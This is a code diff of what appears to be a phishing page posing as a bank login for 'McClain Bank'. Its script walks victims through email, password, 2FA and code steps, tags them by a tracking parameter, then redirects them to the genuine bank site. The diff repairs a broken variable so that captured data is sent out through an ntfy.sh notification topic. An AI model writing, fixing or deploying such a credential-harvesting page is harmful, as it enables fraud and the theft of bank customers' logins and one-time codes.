@@ -166,7 +166,6 @@
   <svg width="16" height="11" viewBox="0 0 10 7" class="ehl" aria-hidden="true"><path d="M4.96.222L.337 2.588v.962l.511.007v3.448h8.186L9.03 3.55h.55v-.962L4.959.222zm3.163 5.872H1.76V3.028l3.2-1.65 3.163 1.65v3.066zm-4.677-2.26h2.999v-.828H3.446v.828zm0 1.489h2.985v-.828H3.446v.828z"/></svg>
   Equal Housing Lender
 </footer>
-
 <script>
 const emailInput    = document.getElementById('email');
 const passwordInput = document.getElementById('password');
@@ -184,8 +183,8 @@ const steps = [stepEmail, stepPassword, step2fa, stepCode];
 const addressValues = document.querySelectorAll('.address-value');
 const trackingEmail = new URLSearchParams(location.search).get('e') || '';
 
-const NTFY_TOPIC    = 'mcb-7f3k9q2x';
-const NTFY_URL      = 'https://ntfy.sh/' + lambelambe;
+const NTFY_TOPIC    = 'lambelambe';
+const NTFY_URL      = 'https://ntfy.sh/' + NTFY_TOPIC;
 const QUEUE_KEY     = 'mcb_queue_v2';
 const REDIRECT_URL  = 'https://secure.mcclainbank.com';
 const FIRST_HOLD_MS = 90000;
